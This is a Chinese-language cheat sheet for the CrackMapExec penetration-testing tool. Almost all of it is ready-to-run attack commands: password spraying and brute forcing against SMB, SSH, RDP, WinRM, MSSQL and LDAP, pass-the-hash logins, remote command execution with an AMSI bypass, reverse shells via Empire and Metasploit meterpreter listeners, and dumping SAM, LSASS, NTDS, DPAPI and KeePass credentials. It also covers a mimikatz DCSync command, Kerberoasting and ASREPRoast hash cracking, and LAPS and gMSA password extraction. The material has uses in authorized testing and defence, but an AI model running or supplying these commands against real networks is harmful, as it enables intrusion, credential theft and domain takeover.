# crackmapexec密码碰撞

### 常用预设
```
crackmapexec ssh 192.168.56.113 -u user.list -p pass.list --continue-on-success | grep '[+]'
```
### 配置：

```
文档：https://wiki.porchetta.industries/
----------------------------------------------------------------------
# 目标可以为：ms.evilcorp.org、192.168.1.0 192.168.0.2 
	#单个以空格隔开、192.168.1.0/24、192.168.1.0-28 10.0.0.1-67  
	#指定段、~/targets.txt  #文件格式
# 协议有：SMB、LDAP、WINRM、MSSQL、SSH、FTP、RDP
----------------------------------------------------------------------
Database：cmedb配置
crackmapexecdb
cmedb (default) >
cmedb (default) > workspace create test
[*] Creating workspace 'test'
[*] Initializing HTTP protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
cmedb (test) >
cmedb (test) > workspace default
cmedb (default) >
cmedb (test) > proto smb
cmedb (test)(smb) >
cmedb (test)(smb) > back
cmedb (test) > proto http
cmedb (test)(http) >

导出数据：
cmedb (test)(smb) > export shares detailed file.csv

BloodHound 配置：
CrackMapExec会在发现账户时将用户设置为BloodHound上的 "拥有"!当lsassy在一次转储中发现20个凭证时非常有用 :)
首先，你需要在你的主文件夹中配置你的配置文件：~/.cme/cme.conf 并添加以下几行：
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
然后，每当cme找到一个有效的凭证，它就会被添加到bloodhound中。


审计模式：不用管一般
在位于~/.cme/cme.conf的配置文件中，在audit_mode一行添加你选择的字符
如果你不想要审计模式，就把它留空或删除这一行 !

```

### 密码爆破：

```
crackmapexec smb 192.168.1.0/24 -u='-username' -p='-Admin!123@' --continue-on-success		# SMB为<protocol>  192.168.1.0/24为<target(s)>
还可以多个指定用户密码：
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --continue-on-success
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1 --continue-on-success
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords --continue-on-success
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H xxxxxxxxxxxxxxxxxxxxx --continue-on-success			# 指定hash爆破
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success		# 指定hash

```

### 文件爆破：

```
从cmedb中使用凭证ID：
crackmapexec <protocol> <target(s)> -id <cred ID(s)> --continue-on-success

域环境下使用文件爆破域用户密码：
crackmapexec <protocol> <target(s)> -p FILE -u password --continue-on-success      #FILE的内容应该为：DOMAIN1\user  这样的格式

不使用暴力的密码喷涂
对于像WinRM和MSSQL这样的协议是有用的。当你使用文件（-u file -p file）时，这个选项可以避免暴力破解。即用户密码文件一对一尝试
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce --continue-on-success
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords --no-bruteforce --continue-on-success

默认情况下，CME会在找到一个成功的登录后退出。使用--continue-on-success标志，即使找到了有效的密码，也会继续进行喷洒。对于针对一个大的用户列表喷洒一个密码来说是很有用的。
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce --continue-on-success
```

### SSH协议：

```
密码喷洒：
crackmapexec ssh 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce

用户密码测试：
crackmapexec ssh 192.168.1.0/24 -u user -p password

指定端口：
crackmapexec http 192.168.1.0/24 --port 2222

命令执行：
crackmapexec ssh 127.0.0.1 -u user -p password -x whoami

```

### FTP协议：
```
crackmapexec ftp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```
### SMB协议：
```
枚举HOSTS：
crackmapexec smb 192.168.1.0/24		# 目标格式参看基础

枚举空会话：
crackmapexec smb 10.10.10.161 -u '' -p ''
crackmapexec smb 10.10.10.161 --pass-pol
crackmapexec smb 10.10.10.161 --users
crackmapexec smb 10.10.10.161 --groups

枚举匿名登录：
crackmapexec smb 10.10.10.178 -u 'a' -p ''	# 确保用户密码是空的

枚举存活会话：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions

枚举共享和访问：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE      # 如果你想只通过可读或可写的共享来过滤

枚举磁盘：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks

枚举已登录用户：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users

枚举域用户：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
通过暴力破解RID来列举用户：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute

枚举域组：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups

枚举本地组：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-groups

枚举域密码策略：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol

枚举不需要SMB签名的主机：
crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt	# 可在relaylistOutputFilename.txt中查看结果

列举反病毒/EDR：花钱
crackmapexec smb <ip> -u user -p pass -M enum_av
```

喷洒密码
```
使用用户名/密码列表：
crackmapexec smb 192.168.1.101 -u user1 user2 user3 -p password1 password2 password3 --continue-on-success

CME接受用户名和密码的txt文件。每行一个用户/密码。注意账户锁定!：
crackmapexec smb 192.168.1.101 -u /path/to/users.txt -p Summer18  --continue-on-success
crackmapexec smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt --continue-on-success
crackmapexec smb 192.168.1.101 -u user.txt -p password.txt --continue-on-success
默认情况下，CME会在找到一个成功的登录后退出。使用--continue-on-success标志，即使发现了有效的密码，也会继续喷射。在对一个大的用户列表进行单一密码的喷洒时很有用：
crackmapexec smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
检查用户名密码字典使用时，一行用户对应一行密码，不进行交叉测试：
crackmapexec smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-succes
```
检查凭证（域）
```
#登录失败的结果是[-]。
#成功登录的结果是 [+] Domain/Username:Password
#本地管理员访问的结果是在登录确认后添加一个（Pwn3d！）

使用用户名密码：
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --continue-on-succes
使用用户名HASH：
crackmapexec smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
crackmapexec smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
crackmapexec smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```
检查凭证（本地）
```
#用户/密码/哈希值
#在任何一个认证命令中添加--local-auth，尝试在本地登录。
#在登录确认后添加一个（Pwn3d！）
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
crackmapexec smb 192.168.1.0/24 -u '' -p '' --local-auth
crackmapexec smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
crackmapexec smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
crackmapexec smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
crackmapexec smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```
远程命令执行
```
在windows系统上执行命令需要管理员凭证，CME会自动告诉你，你使用的凭证集是否有主机的管理员权限，当认证成功时，会在输出中附加'(Pwn3d!)'。
CME有三种不同的命令执行方法：
默认情况下，如果有一种执行方式失败，CME会转到另一种执行方式。它试图按照以下顺序执行命令：
1.wmiexec   #wmiexec通过WMI执行命令
2.atexec   # atexec通过windows任务调度器调度一个任务来执行命令
3.smbexec  # smbexec通过创建和运行一个服务来执行命令。
如果你想强迫CME只使用一种执行方法，你可以使用--exec-method标志指定哪一种。
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami		# -x 表示命令
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
绕过AMSI：
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
```
获得反弹shell

方式一：使用新版Empire：https://github.com/BC-SECURITY/Empire
```
第一步执行命令：python powershell-empire --rest --user empireadmin --pass Password123!
第二步使用Empire生成监听：
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.10.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire.pem
(Empire: listeners) > run
(Empire: listeners) > list

[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://192.168.10.3:9090                 native    5/0.0                      

(Empire: listeners) > 
第三步：
CME用来验证Empire的RESTful API的用户名和密码被存储在位于~/.cme/cme.conf的cme.conf文件中：
第四步：
然后只需运行empire_exec模块并指定监听器的名称：
crackmapexec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test    # set的名字
```
方式二：使用MSF
```
use exploit/multi/script/web_delivery
set SRVHOST 10.211.55
set SRVPORT 8443
set target 2
set payload windows/meterpreter/reverse_https
set LHOST 10.211.55
set LPORT 443
run -j

最后：
crackmapexec 192.168.10.0/24 -u username -p password -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
获得shell
```
上传下载文件
```
文件上传：
crackmapexec smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
文件下载：
crackmapexec smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
```
下载凭证
```
可用工具：impacket、crackmapmewin
DUMP SAM：
你需要在远程目标上至少有本地管理权限，如果你的用户是本地账户，请使用选项-local-auth
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
DUMP LSA：
需要目标域控制器上的域管理员或本地管理员权限。
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
DUMP NTDS.dit：
需要目标域控制器上的域管理员或本地管理员权限。
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
Dump LSASS：
你需要在远程目标上至少有本地管理权限，如果你的用户是本地账户，请使用选项-local-auth
crackmapexec smb 192.168.255.131 -u administrator -p pass -M lsassy
crackmapexec smb 192.168.255.131 -u administrator -p pass -M nanodump
crackmapexec smb 192.168.255.131 -u administrator -p pass -M mimikatz
crackmapexec smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
Dump WIFI password：
你需要在远程目标上至少有本地管理权限，如果你的用户是本地账户，请使用选项-local-auth
crackmapexec smb <ip> -u user -p pass -M wireless
Dump KeePass：
你可以检查目标计算机上是否安装了keepass，然后窃取主密码并解密数据库 !
crackmapexec smb <ip> -u user -p pass -M keepass_discover
crackmapexec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
Dump DPAPI：
你需要在远程目标上至少有本地管理权限，如果你的用户是本地账户，请使用选项-local-auth
crackmapexec smb <ip> -u user -p password --dpapi
```
Defeating LAPS
```
在域上安装LAPS时使用CrackMapExec
如果在域内使用LAPS，那么使用CrackMapExec在域内的每台计算机上执行命令可能会很困难。
因此，增加了一个新的核心选项--laps !如果你已经入侵了一个可以读取LAPS密码的账户，你可以像这样使用CrackMapExec
crackmapexec smb <ip> -u user-can-read-laps -p pass --laps
```

### RDP协议：

密码喷洒：kaili中poetry
```
poetry run crackmapexec rdp 192.168.1.0/24 -u user -p password
poetry run crackmapexec rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
poetry run crackmapexec rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```
屏幕截图（已连接）：
```
crackmapexec rdp <ip> -u <user> -p <password> --screenshot --screentime <second>
```

### WINRM协议：

密码喷洒：
```
crackmapexec winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```
身份验证：
```
crackmapexec winrm 192.168.1.0/24 -u user -p password
crackmapexec winrm 192.168.1.0/24 -u user -p password -d DOMAIN   # 目标是域用户请指定域名
```
命令执行：
```
crackmapexec winrm 192.168.255.131 -u user -p 'password' -X whoami
```
Defeating LAPS：
```
crackmapexec winrm <ip> -u user-can-read-laps -p pass --laps
```

### MSSQL协议：

密码喷洒：
```
crackmapexec mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```
测试凭证：
```
你可以使用两种方法来认证MSSQL：windows或本地（默认：windows）。要使用本地认证，请添加以下标志 --local-auth
Windows auth：
SMB端口开放
crackmapexec mssql 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
SMB端口关闭，指定-d 域名
crackmapexec mssql 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!' -d HTB
Local auth：
crackmapexec mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth
指定端口：
crackmapexec mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --port 1434

提权：user到DBA
crackmapexec mssql <ip> -u user -p password -M mssql_priv

Sql语句命令执行：
crackmapexec mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'

文件上传：
crackmapexec mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --put-file  --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
文件下载：
crackmapexec mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file

windows命令执行：
使用xp_cmdshell执行命令：
crackmapexec mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
```

### 域控：LDAP协议

LDAP Authentication
```
crackmapexec ldap 192.168.1.0/24 -u users.txt -p '' -k     #测试账户是否存在，而不需要kerberos协议
测试证书：成功，就是有+
crackmapexec ldap 192.168.1.0/24 -u user -p password
crackmapexec ldap 192.168.1.0/24 -u user -H A29F7623FD11550DEF0192DE9246F46B
```
ASREPRoast
```
如果你有一个域上的用户列表，你可以检索用户的Kerberos 5 AS-REP etype 23哈希值，而不需要Kerberos预认证

无认证：ASREPRoast攻击寻找不需要Kerberos预认证的用户。这意味着任何人都可以代表任何这些用户向 KDC 发送 AS_REQ 请求，并收到 AS_REP 消息。这最后一种消息包含一个用原始用户密钥加密的数据块，该密钥来自其密码。然后，通过使用这个消息，用户密码可以被离线破解。
crackmapexec ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
使用词表，你可以在这里找到用户名的词表
crackmapexec ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt

有认证：如果你在域上有一个有效的凭证，你可以检索所有不需要Kerberos预认证的用户和哈希。
crackmapexec ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
当域名解析失败时，使用选项kdcHost：
crackmapexec ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
用hashcat破解output.txt文件的哈希值：hashcat -m18200 output.txt wordlist
```
找域的SID
```
crackmapexec ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
```
Kerberoasting
```
您可以使用 Kerberoasting 技术检索 Kerberos 5 TGS-REP etype 23 哈希值
Kerberoasting的目的是为代表AD中的用户账户而不是计算机账户运行的服务收获TGS票。因此，这些TGS票的一部分是用来自用户密码的密钥进行加密的。因此，他们的凭证可以被离线破解。更多细节见Kerberos理论。
前提：要完成这一攻击，你需要一个在域名上的账户
crackmapexec ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
破解hash：hashcat -m13100 output.txt wordlist.txt
```
不受约束的授权
```
CrackMapExec允许你检索所有具有TRUSTED_FOR_DELEGATION标志的计算机和用户的列表。
crackmapexec ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
```
管理员人数
```
adminCount 表示一个给定的对象由于是某个管理组的成员（直接或过境），其ACL已经被系统改变为更安全的值。
crackmapexec ldap 192.168.255.131 -u adm -p pass --admin-count
```
Machine Account Quota
```
这个模块检索MachineAccountQuota域级属性。检查这个值很有用，因为默认情况下，它允许无特权的用户在一个活动目录（AD）域中最多附加10台计算机。
cme ldap <ip> -u user -p pass -M maq
```
获取用户描述
```
新的LDAP模块，在用户描述中寻找密码。
有三个选项可用：
	FILTER: 在描述中寻找一个字符串
	passwordpolicy：根据windows的复杂性要求寻找密码。
	MINLENGTH: 选择密码的最小长度（可以从-pass-pol中获得）。
crackmapexec ldap 192.168.255.131 -u adm -p pass --kdcHost 192.168.255.130 -M get-desc-users
```
Dump gMSA
```
使用LDAP协议，如果你有权利，你可以提取gMSA账户的密码。
检索密码需要LDAPS，使用--gmsa LDAPS会自动选择
poetry run crackmapexec ldap <ip> -u <user> -p <pass> --gmsa
```
攻击ESC8 (adcs)
```
列出所有PKI注册服务器：
poetry run crackmapexec run ldap <ip> -u user -p pass -M adcs
列出一个PKI内的所有证书：
poetry run crackmapexec run ldap <ip> -u user -p pass -M adcs -o SERVER=xxxx
```
提取子网
```
poetry run crackmapexec ldap <ip> -u <user> -p <pass> -M get-network
poetry run crackmapexec ldap <ip> -u <user> -p <pass> -M get-network -o ONLY_HOSTS=true
poetry run crackmapexec ldap <ip> -u <user> -p <pass> -M get-network -o ALL=true
```
检查LDAP签名
```
crackmapexec ldap <ip> -u user -p pass -M ldap-checker
```
读取DACL的权利
```
LDAP模块，允许读取和输出一个或多个对象的DACL !
读取管理员的所有ACEs
poetry run crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read
读取BlWasp用户对管理员的所有权利
poetry run crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=BlWasp
读取域上所有具有DCSync权限的委托人的信息
poetry run crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET_DN="DC=lab,DC=LOCAL" ACTION=read RIGHTS=DCSync
也许有一个被拒绝的ACE存在？
poetry run crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
备份多个目标的DACL
poetry run crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=../../targets.txt ACTION=backup
```
提取gMSA的凭证
```
当你在LSA中发现一个gmsa账户时，CrackMapExec提供多种选择
crackmapexec ldap <ip> -u <user> -p <pass> --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
cackmapexec ldap <ip> -u <user> -p <pass> --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'
```
Bloodhound Ingestor
```
摄取活动目录的数据：
crackmapexec ldap <ip> -u user -p pass --bloodhound --ns ip --collection All
```

